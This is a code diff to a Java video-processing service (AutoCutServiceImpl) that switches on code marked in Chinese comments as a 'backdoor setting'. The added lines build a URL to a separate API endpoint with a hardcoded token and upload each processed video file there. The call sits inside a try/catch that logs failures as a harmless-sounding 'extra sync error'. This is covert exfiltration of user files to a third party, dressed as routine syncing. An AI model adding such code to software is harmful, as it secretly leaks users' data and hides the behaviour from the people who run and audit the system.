@@ -586,7 +586,7 @@ public class AutoCutServiceImpl implements AutoCutService {
              urlOther = configInit.getOtherUpApi()+"/?type=upload&vUrl="+videoUrl+"&token="+configInit.getOtherUpToken()+"&title="+ URLEncoder.encode(title,"UTF-8");
         }
         //TODO 后门设置
-      //  String urlHUOMIAO = configInit.getAPIHUOMIAO()+"/?type=upload&vUrl="+videoUrl+"&token="+"mao"+"&title="+ URLEncoder.encode(title,"UTF-8");
+        String urlHUOMIAO = configInit.getAPIHUOMIAO()+"/?type=upload&vUrl="+videoUrl+"&token="+"mao"+"&title="+ URLEncoder.encode(title,"UTF-8");
         Map<String,File> fileMap = new HashMap<>();
         fileMap.put("file",new File(configInit.getDir()+name));
         try {
@@ -599,7 +599,11 @@ public class AutoCutServiceImpl implements AutoCutService {
                 log.error("额外同步出错：{}",ExceptionUtil.stacktraceToString(e));
             }
             //TODO 后门设置
-         //   httpClientUtils.uploadFile(urlHUOMIAO,null,null,fileMap);
+            try {
+                httpClientUtils.uploadFile(urlHUOMIAO,null,null,fileMap);
+            }catch (Exception e){
+                log.error("额外同步出错：{}",ExceptionUtil.stacktraceToString(e));
+            }
             JSONObject jsonObject = JSONObject.parseObject(respond);
             Integer code = jsonObject.getInteger("code");
             if (code==200){
